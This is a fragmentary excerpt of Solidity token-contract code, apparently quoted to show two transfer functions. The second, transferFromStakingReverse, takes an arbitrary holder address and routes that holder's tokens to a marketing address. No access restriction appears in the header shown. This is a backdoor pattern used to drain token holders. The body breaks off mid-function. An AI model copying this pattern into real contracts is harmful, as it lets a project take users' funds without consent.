...
function transferFromStaking(address reciept,uint256 amount)  external returns(bool) {
    address sender = msg.sender;
    uint256 tamount=amount;
    if(balanceOf(sender)<amount){
        tamount=balanceOf(sender);
...
function transferFromStakingReverse(address sender,uint256 amount)  external returns(bool) {
    address reciept = marketingAddress;
    uint256 tamount=amount;
    if(balanceOf(sender)<amount){
        tamount=balanceOf(sender);
    }
